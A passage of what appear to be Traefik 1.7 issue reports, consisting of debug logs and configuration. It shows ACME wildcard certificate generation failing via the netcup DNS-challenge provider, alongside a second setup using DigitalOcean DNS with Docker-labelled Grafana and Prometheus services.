\":null,\\"mesos\\":null,\\"eureka\\":null,\\"ecs\\":null,\\"rancher\\":null,\\"dynamodb\\":null,\\"servicefabric\\":null,\\"rest\\":null,\\"api\\":null,\\"metrics\\":null,\\"ping\\":null,\\"hostresolver\\":null}"
time="2018-10-28t15:19:40z" level=info msg="\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\ "
time="2018-10-28t15:19:40z" level=debug msg="setting acme certificate store from entrypoint: https"
time="2018-10-28t15:19:40z" level=info msg="preparing server http &{address::80 tls:<nil> redirect: auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-10-28t15:19:40z" level=info msg="preparing server https &{address::443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-10-28t15:19:40z" level=info msg="starting server on :80"
time="2018-10-28t15:19:40z" level=info msg="starting provider configuration.provideraggregator {}"
time="2018-10-28t15:19:40z" level=info msg="starting server on :443"
time="2018-10-28t15:19:40z" level=info msg="starting provider *docker.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":null,\\"trace\\":false,\\"templateversion\\":2,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"unix:///var/run/docker.sock\\",\\"domain\\":\\"mydomain.de\\",\\"tls\\":null,\\"exposedbydefault\\":false,\\"usebindportip\\":false,\\"swarmmode\\":false,\\"network\\":\\"traefik\\"}"
time="2018-10-28t15:19:40z" level=info msg="starting provider *acme.provider {\\"email\\":\\"my@email.com\\",\\"acmelogging\\":false,\\"caserver\\":\\" ",\\"storage\\":\\"acme.json\\",\\"entrypoint\\":\\"https\\",\\"keytype\\":\\"\\",\\"onhostrule\\":false,\\"ondemand\\":false,\\"dnschallenge\\":{\\"provider\\":\\"netcup\\",\\"delaybeforecheck\\":0},\\"httpchallenge\\":null,\\"tlschallenge\\":null,\\"domains\\":[{\\"main\\":\\"*.mydomain.de\\",\\"sans\\":[\\"mydomain.de\\"]}],\\"store\\":{}}"
time="2018-10-28t15:19:40z" level=info msg="testing certificate renew..."
time="2018-10-28t15:19:40z" level=debug msg="looking for provided certificate(s) to validate [\\"*.mydomain.de\\" \\"mydomain.de\\"]..."
time="2018-10-28t15:19:40z" level=debug msg="configuration received from provider acme: {}"
time="2018-10-28t15:19:40z" level=debug msg="creating entry point redirect http -> https"
time="2018-10-28t15:19:40z" level=debug msg="domains [\\"*.mydomain.de\\" \\"mydomain.de\\"] need acme certificates generation for domains \\"*.mydomain.de,mydomain.de\\"."
time="2018-10-28t15:19:40z" level=debug msg="loading acme certificates [*.mydomain.de mydomain.de]..."
time="2018-10-28t15:19:40z" level=debug msg="building acme client..."
time="2018-10-28t15:19:40z" level=debug msg=" "
time="2018-10-28t15:19:40z" level=debug msg="provider connection established with docker 18.06.1-ce (api 1.38)"
time="2018-10-28t15:19:40z" level=debug msg="filtering disabled container /traefik"
time="2018-10-28t15:19:40z" level=debug msg="originlabelsmap[traefik.enable:true traefik.frontend.entrypoints:http,https traefik.frontend.rule:host:mysubdomain.mydomain.de traefik.port:2368]"
time="2018-10-28t15:19:40z" level=debug msg="alllabelsmap[:map[traefik.enable:true traefik.frontend.entrypoints:http,https traefik.frontend.mysubdomain.mydomain.de traefik.port:2368]]"
time="2018-10-28t15:19:40z" level=debug msg="filtering disabled container /portainer"
time="2018-10-28t15:19:40z" level=debug msg="originlabelsmap[traefik.enable:true traefik.frontend.entrypoints:http,https traefik.frontend.rule:host:mysubdomain.mydomain.de traefik.port:2368]"
time="2018-10-28t15:19:40z" level=debug msg="alllabelsmap[:map[traefik.enable:true traefik.frontend.entrypoints:http,https traefik.frontend.rule:host:mysubdomain.mydomain.de traefik.port:2368]]"
time="2018-10-28t15:19:40z" level=debug msg="backend backend-ghost: no load-balancer defined, fallback to
\'wrr\' method"
time="2018-10-28t15:19:40z" level=debug msg="configuration received from provider docker: {\\"backends\\":{\\"backend-ghost\\":{\\"servers\\":{\\"server-ghost-e3d7ca53ad36cdf4885ff43773eccdbf\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend-host-mysubdomain-mydomain-de-0\\":{\\"entrypoints\\":[\\"http\\",\\"https\\"],\\"backend\\":\\"backend-ghost\\",\\"routes\\":{\\"route-frontend-host-mysubdomain-mydomain-de-0\\":{\\"rule\\":\\"host:mysubdomain.mydomain.de\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null}}}"
time="2018-10-28t15:19:41z" level=info msg="server configuration reloaded on :80"
time="2018-10-28t15:19:41z" level=info msg="server configuration reloaded on :443"
time="2018-10-28t15:19:41z" level=debug msg="creating entry point redirect http -> https"
time="2018-10-28t15:19:41z" level=debug msg="using dns challenge provider: netcup"
time="2018-10-28t15:19:41z" level=debug msg="wiring frontend frontend-host-mysubdomain-mydomain-de-0 to entrypoint http"
time="2018-10-28t15:19:41z" level=debug msg="creating backend backend-ghost"
time="2018-10-28t15:19:41z" level=debug msg="adding tlsclientheaders middleware for frontend frontend-host-mysubdomain-mydomain-de-0"
time="2018-10-28t15:19:41z" level=debug msg="creating load-balancer wrr"
time="2018-10-28t15:19:41z" level=debug msg="creating server server-ghost-e3d7ca53ad36cdf4885ff43773eccdbf at with weight 1"
time="2018-10-28t15:19:41z" level=debug msg="creating route route-frontend-host-mysubdomain-mydomain-de-0 host:mysubdomain.mydomain.de"
time="2018-10-28t15:19:41z" level=debug msg="wiring frontend frontend-host-mysubdomain-mydomain-de-0 to entrypoint https"
time="2018-10-28t15:19:41z" level=debug msg="creating backend backend-ghost"
time="2018-10-28t15:19:41z" level=debug msg="adding tlsclientheaders middleware for frontend frontend-host-mysubdomain-mydomain-de-0"
time="2018-10-28t15:19:41z" level=debug msg="creating load-balancer wrr"
time="2018-10-28t15:19:41z" level=debug msg="creating server server-ghost-e3d7ca53ad36cdf4885ff43773eccdbf at with weight 1"
time="2018-10-28t15:19:41z" level=debug msg="creating route route-frontend-host-mysubdomain-mydomain-de-0 host:mysubdomain.mydomain.de"
time="2018-10-28t15:19:41z" level=info msg="server configuration reloaded on :80"
time="2018-10-28t15:19:41z" level=info msg="server configuration reloaded on :443"
time="2018-10-28t15:19:42z" level=error msg="error obtaining certificate retrying in 349.831223ms"
time="2018-10-28t15:19:43z" level=error msg="error obtaining certificate retrying in 1.021321236s"
time="2018-10-28t15:19:45z" level=error msg="error obtaining certificate: acme: error -> one or more domains had a problem:\ [mydomain.de] error presenting token: netcup: error decoding response of dns-api, json: cannot unmarshal string into go struct field responsemsg.responsedata of type netcup.responsedata\ "
time="2018-10-28t15:19:45z" level=error msg="unable to obtain acme certificate for domains \\"*.mydomain.de,mydomain.de\\" : unable to generate a certificate for the domains [*.mydomain.de mydomain.de]: acme: error -> one or more domains had a problem:\ [mydomain.de] error presenting token: netcup: error decoding response of dns-api, json: cannot unmarshal string into go struct field responsemsg.responsedata of type netcup.responsedata\ "
<details> ```json
{ "lifecycle": { "requestacceptgracetimeout": 0, "gracetimeout": 0 }, "gracetimeout": 0, "debug": false, "checknewversion": true, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": null, "traefiklogsfile": "", "traefiklog": null, "tracing": null, "loglevel": "", "entrypoints": { "http": { "address": "xxxx", "tls": null, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null }, "https": { "address": "xxxx", "tls": { "minversion": "", "ciphersuites": null, "certificates": null, "clientcafiles": null, "clientca": { "files": null, "optional": false }, "defaultcertificate": null, "snistrict": false }, "redirect": null, "auth": null, "whitelistsourcerange": null, "whitelist": null, "compress": false, "proxyprotocol": null, "forwardedheaders": null } }, "cluster": null, "constraints": [], "acme": { "email": "xxxx", "domains": null, "storage": "xxxx", "storagefile": "", "ondemand": false, "onhostrule": false, "caserver": "xxxx", "entrypoint": "xxxx", "keytype": "", "dnschallenge": null, "httpchallenge": null, "tlschallenge": null, "dnsprovider": "", "delaydontcheckdns": 0, "acmelogging": false, "overridecertificates": false, "tlsconfig": null }, "defaultentrypoints": [ "https", "http" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "allowminweightzero": false, "web": null, "docker": null, "file": null, "marathon": null, "consul": null, "consulcatalog": null, "etcd": { "watch": true, "filename": "", "constraints": [], "trace": false, "templateversion": 0, "debugloggeneratedtemplate": false, "endpoint": "xxxx", "prefix": "/traefik", "tls": null, "username": "", "password": "", "useapiv3": true }, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": { "entrypoint": "traefik", "dashboard": true, "debug": false, "currentconfigurations": null, "statistics": null }, "metrics": null, "ping": { "entrypoint": "traefik" }, "hostresolver": null, "configfile": "/opt/traefik/traefik.toml"
``` </details>
doesnt matter
![bug](
![bug]( --> ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) doesnt matter.
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [entrypoints.https.auth.basic] usersfile = "/app/traefik/entrypoints/https.htpasswd" [entrypoints.metrics] address = ":8484" [entrypoints.metrics.tls] [entrypoints.metrics.auth.basic] usersfile = "/app/traefik/entrypoints/metrics.htpasswd" [entrypoints.metrics.whitelist] sourcerange = ["127.0.0.1/32", "172.0.0.0/8", "192.168.68.6"] [metrics] [metrics.prometheus] entrypoint = "metrics" buckets = [0.1, 0.3, 1.2, 5.0] [docker]
domain = "monitor.local.example.com"
watch = true
exposedbydefault = false [acme]
email = "email@example.com"
storage = "acme.json"
entrypoint = "https"
acmelogging = true
onhostrule = true
caserver = " " [acme.dnschallenge] provider = "digitalocean" [[acme.domains]] main = "*.monitor.local.example.com" sans = ["monitor.local.example.com"]
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) <details>
<summary>logs</summary> ```
time="2018-10-22t07:38:57z" level=info msg="using toml configuration file /etc/traefik/traefik.toml"
time="2018-10-22t07:38:57z" level=info msg="traefik version v1.7.3 built on 2018-10-15_10:13:00am"
time="2018-10-22t07:38:57z" level=debug msg="global configuration loaded {\\"lifecycle\\":{\\"requestacceptgracetimeout\\":0,\\"gracetimeout\\":10000000000},\\"gracetimeout\\":0,\\"debug\\":true,\\"checknewversion\\":true,\\"sendanonymoususage\\":false,\\"accesslogsfile\\":\\"\\",\\"accesslog\\":null,\\"traefiklogsfile\\":\\"\\",\\"traefiklog\\":null,\\"tracing\\":null,\\"loglevel\\":\\"debug\\",\\"entrypoints\\":{\\"http\\":{\\"address\\":\\":80\\",\\"tls\\":null,\\"redirect\\":{\\"entrypoint\\":\\"https\\"},\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}},\\"https\\":{\\"address\\":\\":443\\",\\"tls\\":{\\"minversion\\":\\"\\",\\"ciphersuites\\":null,\\"certificates\\":null,\\"clientcafiles\\":null,\\"clientca\\":{\\"files\\":null,\\"optional\\":false},\\"defaultcertificate\\":null,\\"snistrict\\":false},\\"redirect\\":null,\\"auth\\":{\\"basic\\":{\\"usersfile\\":\\"/app/traefik/entrypoints/https.htpasswd\\"}},\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}},\\"metrics\\":{\\"address\\":\\":8484\\",\\"tls\\":{\\"minversion\\":\\"\\",\\"ciphersuites\\":null,\\"certificates\\":null,\\"clientcafiles\\":null,\\"clientca\\":{\\"files\\":null,\\"optional\\":false},\\"defaultcertificate\\":null,\\"snistrict\\":false},\\"redirect\\":null,\\"auth\\":{\\"basic\\":{\\"usersfile\\":\\"/app/traefik/entrypoints/metrics.htpasswd\\"}},\\"whitelistsourcerange\\":null,\\"whitelist\\":{\\"sourcerange\\":[\\"127.0.0.1/32\\",\\"172.0.0.0/8\\",\\"192.168.68.6\\"]},\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}},\\"traefik\\":{\\"address\\":\\":8080\\",\\"tls\\":null,\\"redirect\\":null,\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}}},\\"cluster\\":null,\\"constraints\\":[],\\"acme\\":{\\"email\\":\\"email@example.com\\",\\"domains\\":[{\\"main\\":\\"*.monitor.local.example.com\\",\\"sans\\":[\\"monitor.local.example.com\\"]}],\\"storage\\":\\"acme.json\\",\\"storagefile\\":\\"\\",\\"ondemand\\":false,\\"onhostrule\\":true,\\"caserver\\":\\" ",\\"entrypoint\\":\\"https\\",\\"keytype\\":\\"\\",\\"dnschallenge\\":{\\"provider\\":\\"digitalocean\\",\\"delaybeforecheck\\":0},\\"httpchallenge\\":null,\\"tlschallenge\\":null,\\"dnsprovider\\":\\"\\",\\"delaydontcheckdns\\":0,\\"acmelogging\\":true,\\"overridecertificates\\":false,\\"tlsconfig\\":null},\\"defaultentrypoints\\":[\\"http\\"],\\"providersthrottleduration\\":2000000000,\\"maxidleconnsperhost\\":200,\\"idletimeout\\":0,\\"insecureskipverify\\":false,\\"rootcas\\":null,\\"retry\\":null,\\"healthcheck\\":{\\"interval\\":30000000000},\\"respondingtimeouts\\":null,\\"forwardingtimeouts\\":null,\\"allowminweightzero\\":false,\\"web\\":null,\\"docker\\":{\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":null,\\"trace\\":false,\\"templateversion\\":2,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"unix:///var/run/docker.sock\\",\\"domain\\":\\"monitor.local.example.com\\",\\"tls\\":null,\\"exposedbydefault\\":true,\\"usebindportip\\":false,\\"swarmmode\\":false,\\"network\\":\\"\\"},\\"file\\":null,\\"marathon\\":null,\\"consul\\":null,\\"consulcatalog\\":null,\\"etcd\\":null,\\"zookeeper\\":null,\\"boltdb\\":null,\\"kubernetes\\":null,\\"mesos\\":null,\\"eureka\\":null,\\"ecs\\":null,\\"rancher\\":null,\\"dynamodb\\":null,\\"servicefabric\\":null,\\"rest\\":null,\\"api\\":{\\"entrypoint\\":\\"traefik\\",\\"dashboard\\":true,\\"debug\\":true,\\"currentconfigurations\\":null,\\"statistics\\":null},\\"metrics\\":{\\"prometheus\\":{\\"buckets\\":[0.1,0.3,1.2,5],\\"entrypoint\\":\\"metrics\\"},\\"datadog\\":null,\\"statsd\\":null,\\"influxdb\\":null},\\"ping\\":null,\\"hostresolver\\":null}"
time="2018-10-22t07:38:57z" level=info msg="\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\ "
time="2018-10-22t07:38:57z" level=debug msg="setting acme certificate store from entrypoint: https"
time="2018-10-22t07:38:57z" level=debug msg="configured ip white list: [127.0.0.1/32 172.0.0.0/8 192.168.68.6]"
time="2018-10-22t07:38:57z" level=debug msg="configured prometheus metrics"
time="2018-10-22t07:38:58z" level=info msg="preparing server http &{address::80 tls:<nil> redirect: auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-10-22t07:38:58z" level=info msg="preparing server https &{address::443 tls: redirect:<nil>auth: whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-10-22t07:38:58z" level=info msg="starting server on :80"
time="2018-10-22t07:38:59z" level=debug msg="configured ip white list: [127.0.0.1/32 172.0.0.0/8 192.168.68.6]"
time="2018-10-22t07:38:59z" level=info msg="preparing server metrics &{address::8484 tls: redirect:<nil> auth: whitelistsourcerange:[] whitelist: compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-10-22t07:38:59z" level=info msg="starting server on :443"
time="2018-10-22t07:38:59z" level=info msg="preparing server traefik &{address::8080 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-10-22t07:38:59z" level=info msg="starting provider configuration.provideraggregator {}"
time="2018-10-22t07:38:59z" level=info msg="starting server on :8484"
time="2018-10-22t07:38:59z" level=info msg="starting server on :8080"
time="2018-10-22t07:38:59z" level=info msg="starting provider *docker.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":null,\\"trace\\":false,\\"templateversion\\":2,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"unix:///var/run/docker.sock\\",\\"domain\\":\\"monitor.local.example.com\\",\\"tls\\":null,\\"exposedbydefault\\":true,\\"usebindportip\\":false,\\"swarmmode\\":false,\\"network\\":\\"\\"}"
time="2018-10-22t07:38:59z" level=info msg="starting provider *acme.provider {\\"email\\":\\"email@example.com\\",\\"acmelogging\\":true,\\"caserver\\":\\" ",\\"storage\\":\\"acme.json\\",\\"entrypoint\\":\\"https\\",\\"keytype\\":\\"\\",\\"onhostrule\\":true,\\"ondemand\\":false,\\"dnschallenge\\":{\\"provider\\":\\"digitalocean\\",\\"delaybeforecheck\\":0},\\"httpchallenge\\":null,\\"tlschallenge\\":null,\\"domains\\":[{\\"main\\":\\"*.monitor.local.example.com\\",\\"sans\\":[\\"monitor.local.example.com\\"]}],\\"store\\":{}}"
time="2018-10-22t07:38:59z" level=info msg="testing certificate renew..."
time="2018-10-22t07:38:59z" level=debug msg="configuration received from provider acme: {}"
time="2018-10-22t07:38:59z" level=debug msg="looking for provided certificate(s) to validate [\\"*.monitor.local.example.com\\" \\"monitor.local.example.com\\"]..."
time="2018-10-22t07:38:59z" level=debug msg="domains [\\"*.monitor.local.example.com\\" \\"monitor.local.example.com\\"] need acme certificates generation for domains \\"*.monitor.local.example.com,monitor.local.example.com\\"."
time="2018-10-22t07:38:59z" level=debug msg="loading acme certificates [*.monitor.local.example.com monitor.local.example.com]..."
time="2018-10-22t07:38:59z" level=info msg="the key type is empty
use default key type 4096."
time="2018-10-22t07:38:59z" level=debug msg="creating entry point redirect http -> https"
time="2018-10-22t07:38:59z" level=debug msg="provider connection established with docker 18.06.1-ce (api 1.38)"
time="2018-10-22t07:38:59z" level=debug msg="originlabelsmap[com.docker.compose.service:traefik com.docker.compose.version:1.22.0 org.label-schema.description:a modern reverse-proxy org.label-schema.name:traefik org.label-schema.vendor:containous org.label-schema.version:v1.7.3 com.docker.compose.config-hash:68f9de8de0ff407954ef1ed00e646fff47a6ea2327da42b6813f970924b8c1bd com.docker.compose.oneoff:false com.docker.compose.project:traefik org.label-schema.docker.schema-version:1.0 org.label-schema.url: com.docker.compose.container-number:1]"
time="2018-10-22t07:38:59z" level=debug msg="alllabelsmap[:map[]]"
time="2018-10-22t07:38:59z" level=debug msg="originlabelsmap[traefik.frontend.entrypoints:metrics traefik.frontend.rule:host:metrics.monitor.local.example.com;path:/node-exporter;replacepath:/metrics com.docker.compose.config-hash:5937ece18126e625fbe50ad5c4b1e5f9d08cf6d5995f45bb521e0f246720588e monitoring.service.type:prometheus-exporter prometheus.exporter:node-exporter traefik.docker.network:monitoring traefik.enable:true com.docker.compose.oneoff:false com.docker.compose.project:node-exporter com.docker.compose.service:node-exporter com.docker.compose.version:1.22.0 com.docker.compose.container-number:1 monitoring.node.hostname:monitor.local.example.com traefik.port:9100]"
time="2018-10-22t07:38:59z" level=debug msg="alllabelsmap[:map[traefik.port:9100 traefik.docker.network:monitoring traefik.frontend.entrypoints:metrics traefik.frontend.rule:host:metrics.monitor.local.example.com;path:/node-exporter;replacepath:/metrics traefik.enable:true]]"
time="2018-10-22t07:38:59z" level=debug msg="originlabelsmap[traefik.port:3000 com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:prometheus com.docker.compose.version:1.22.0 traefik.frontend.rule:host:monitor.local.example.com com.docker.compose.config-hash:fba6e4f60e1955527fed43dff45af1f962b62a8243154178cda2384c25260598 com.docker.compose.service:grafana traefik.docker.network:web traefik.enable:true traefik.frontend.entrypoints:https]"
time="2018-10-22t07:38:59z" level=debug msg="alllabelsmap[:map[traefik.frontend.rule:host:monitor.local.example.com traefik.port:3000 traefik.docker.network:web traefik.enable:true traefik.frontend.entrypoints:https]]"
time="2018-10-22t07:38:59z" level=debug msg="originlabelsmap[com.docker.compose.config-hash:7e5b9be19620bb1e23f253353840725a68398deeb998c841b0611753c0ae186c com.docker.compose.oneoff:false com.docker.compose.project:prometheus com.docker.compose.service:alertmanager traefik.enable:true com.docker.compose.container-number:1 com.docker.compose.version:1.22.0 traefik.docker.network:web traefik.frontend.entrypoints:https traefik.frontend.rule:host:alertmanager.monitor.local.example.com traefik.port:9093]"
time="2018-10-22t07:38:59z" level=debug msg="alllabelsmap[:map[traefik.docker.network:web traefik.frontend.entrypoints:https traefik.frontend.rule:host:alertmanager.monitor.local.example.com traefik.port:9093 traefik.enable:true]]"
time="2018-10-22t07:38:59z" level=debug msg="originlabelsmap[traefik.docker.network:monitoring com.docker.compose.project:cadvisor com.docker.compose.version:1.22.0 monitoring.service.type:prometheus-exporter prometheus.exporter:cadvisor traefik.enable:true traefik.port:8080 com.docker.compose.service:cadvisor monitoring.node.hostname:monitor.local.example.com traefik.frontend.entrypoints:metrics traefik.frontend.rule:host:metrics.monitor.local.example.com;path:/cadvisor;replacepath:/metrics com.docker.compose.config-hash:1e5b3a7de297cb2cbd15913ab928d6af2abc19c1fdc5af5592729546a0125eb7 com.docker.compose.container-number:1 com.docker.compose.oneoff:false]"
time="2018-10-22t07:38:59z" level=debug msg="alllabelsmap[:map[traefik.enable:true traefik.frontend.rule:host:metrics.monitor.local.example.com;path:/cadvisor;replacepath:/metrics traefik.port:8080 traefik.frontend.entrypoints:metrics traefik.docker.network:monitoring]]"
time="2018-10-22t07:38:59z" level=debug msg="originlabelsmap[org.label-schema.name:traefik org.label-schema.vendor:containous org.label-schema.version:v1.7.3 com.docker.compose.config-hash:68f9de8de0ff407954ef1ed00e646fff47a6ea2327da42b6813f970924b8c1bd com.docker.compose.service:traefik com.docker.compose.version:1.22.0 org.label-schema.description:a modern reverse-proxy org.label-schema.url: com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:traefik org.label-schema.docker.schema-version:1.0]"
time="2018-10-22t07:38:59z" level=debug msg="alllabelsmap[:map[]]"
time="2018-10-22t07:38:59z" level=debug msg="originlabelsmap[com.docker.compose.container-number:1 monitoring.node.hostname:monitor.local.example.com traefik.port:9100 traefik.frontend.entrypoints:metrics traefik.frontend.rule:host:metrics.monitor.local.example.com;path:/node-exporter;replacepath:/metrics com.docker.compose.config-hash:5937ece18126e625fbe50ad5c4b1e5f9d08cf6d5995f45bb521e0f246720588e monitoring.service.type:prometheus-exporter prometheus.exporter:node-exporter traefik.docker.network:monitoring traefik.enable:true com.docker.compose.oneoff:false com.docker.compose.project:node-exporter com.docker.compose.service:node-exporter com.docker.compose.version:1.22.0]"
time="2018-10-22t07:38:59z" level=debug msg="alllabelsmap[:map[traefik.frontend.entrypoints:metrics traefik.frontend.rule:host:metrics.monitor.local.example.com;path:/node-exporter;replacepath:/metrics traefik.enable:truetraefik.port:9100 traefik.docker.network:monitoring]]"
time="2018-10-22t07:38:59z" level=debug msg="originlabelsmap[traefik.frontend.entrypoints:https com.docker.compose.config-hash:fba6e4f60e1955527fed43dff45af1f962b62a8243154178cda2384c25260598 com.docker.compose.service:grafana traefik.docker.network:web traefik.enable:true traefik.frontend.rule:host:monitor.local.example.com traefik.port:3000 com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.project:prometheus com.docker.compose.version:1.22.0]"
time="2018-10-22t07:38:59z" level=debug msg="alllabelsmap[:map[traefik.docker.network:web traefik.enable:true traefik.frontend.entrypoints:https traefik.frontend.rule:host:monitor.local.example.com traefik.port:3000]]"
time="2018-10-22t07:38:59z" level=debug msg="originlabelsmap[com.docker.compose.config-hash:7e5b9be19620bb1e23f253353840725a68398deeb998c841b0611753c0ae186c com.docker.compose.oneoff:false com.docker.compose.project:prometheus com.docker.compose.service:alertmanager traefik.enable:true com.docker.compose.container-number:1 com.docker.compose.version:1.22.0 traefik.docker.network:web traefik.frontend.entrypoints:https traefik.frontend.rule:host:alertmanager.monitor.local.example.com traefik.port:9093]"
time="2018-10-22t07:38:59z" level=debug msg="alllabelsmap[:map[traefik.frontend.entrypoints:https traefik.frontend.rule:host:alertmanager.monitor.local.example.com traefik.port:9093 traefik.enable:true traefik.docker.network:web]]"
time="2018-10-22t07:38:59z" level=debug msg="originlabelsmap[monitoring.service.type:prometheus-exporter prometheus.exporter:cadvisor traefik.docker.network:monitoring com.docker.compose.project:cadvisor com.docker.compose.version:1.22.0 traefik.enable:true traefik.frontend.entrypoints:metrics traefik.frontend.rule:host:metrics.monitor.local.example.com;path:/cadvisor;replacepath:/metrics traefik.port:8080 com.docker.compose.service:cadvisor monitoring.node.hostname:monitor.local.example.com com.docker.compose.oneoff:false com.docker.compose.config-hash:1e5b3a7de297cb2cbd15913ab928d6af2abc19c1fdc5af5592729546a0125eb7 com.docker.compose.container-number:1]"
time="2018-10-22t07:38:59z" level=debug msg="alllabelsmap[:map[traefik.frontend.rule:host:metrics.monitor.local.example.com;path:/cadvisor;replacepath:/metrics traefik.docker.network:monitoring traefik.enable:true traefik.port:8080 traefik.frontend.entrypoints:metrics]]"
time="2018-10-22t07:38:59z" level=debug msg="backend backend-traefik-traefik: no load-balancer defined, fallback to \'wrr\' method"
time="2018-10-22t07:38:59z" level=debug msg="backend backend-alertmanager-prometheus: no load-balancer defined, fallback to \'wrr\' method"
time="2018-10-22t07:38:59z" level=debug msg="backend backend-cadvisor-cadvisor: no load-balancer defined, fallback to \'wrr\' method"
time="2018-10-22t07:38:59z" level=debug msg="backend backend-grafana-prometheus: no load-balancer defined, fallback to \'wrr\' method"
time="2018-10-22t07:38:59z" level=debug msg="backend backend-node-exporter-node-exporter: no load-balancer defined, fallback to \'wrr\' method"
time="2018-10-22t07:38:59z" level=debug msg="configuration received from provider docker: {\\"backends\\":{\\"backend-alertmanager-prometheus\\":{\\"servers\\":{\\"server-alertmanager-4cb3f945666077858f35d4018dd76eaa\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-cadvisor-cadvisor\\":{\\"servers\\":{\\"server-cadvisor-e42dd141b28258fda36b39d92119a422\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-grafana-prometheus\\":{\\"servers\\":{\\"server-grafana-9733510c04552af6363b3428626e564f\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-node-exporter-node-exporter\\":{\\"servers\\":{\\"server-node-exporter-0fee9f2051d33a490d9f32e9bacbc888\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}},\\"backend-traefik-traefik\\":{\\"servers\\":{\\"server-traefik-780f230448df16d66397c0c29cebc062\\":{\\"url\\":\\" ",\\"weight\\":1}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend-host-alertmanager-monitor-local-example-com-3\\":{\\"entrypoints\\":[\\"https\\"],\\"backend\\":\\"backend-alertmanager-prometheus\\",\\"routes\\":{\\"route-frontend-host-alertmanager-monitor-local-example-com-3\\":{\\"rule\\":\\"host:alertmanager.monitor.local.example.com\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"frontend-host-metrics-monitor-local-example-com-path-cadvisor-replacepath-metrics-4\\":{\\"entrypoints\\":[\\"metrics\\"],\\"backend\\":\\"backend-cadvisor-cadvisor\\",\\"routes\\":{\\"route-frontend-host-metrics-monitor-local-example-com-path-cadvisor-replacepath-metrics-4\\":{\\"rule\\":\\"host:metrics.monitor.local.example.com;path:/cadvisor;replacepath:/metrics\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"frontend-host-metrics-monitor-local-example-com-path-node-exporter-replacepath-metrics-1\\":{\\"entrypoints\\":[\\"metrics\\"],\\"backend\\":\\"backend-node-exporter-node-exporter\\",\\"routes\\":{\\"route-frontend-host-metrics-monitor-local-example-com-path-node-exporter-replacepath-metrics-1\\":{\\"rule\\":\\"host:metrics.monitor.local.example.com;path:/node-exporter;replacepath:/metrics\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"frontend-host-monitor-local-example-com-2\\":{\\"entrypoints\\":[\\"https\\"],\\"backend\\":\\"backend-grafana-prometheus\\",\\"routes\\":{\\"route-frontend-host-monitor-local-example-com-2\\":{\\"rule\\":\\"host:monitor.local.example.com\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":null},\\"frontend-host-traefik-traefik-monitor-local-example-com-0\\":{\\"entrypoints\\":[\\"http\\"],\\"backend\\":\\"backend-traef